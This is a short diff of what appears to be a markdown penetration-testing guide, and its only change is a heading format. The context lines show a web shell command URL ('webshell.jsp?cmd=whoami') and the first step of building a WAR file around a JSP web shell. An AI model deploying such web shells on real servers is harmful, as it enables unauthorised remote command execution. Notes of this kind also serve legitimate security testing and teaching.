@@ -63,7 +63,7 @@ Technique 11. ...
 	    + http://target_IP:port/webshell/webshell.jsp?cmd=whoami
 ```
  
-<i>Example - How to create a WAR file</i>
+##### <i>Example - How to create a WAR file</i>
 ```
 1. Choose a Web shell (.jsp)
 
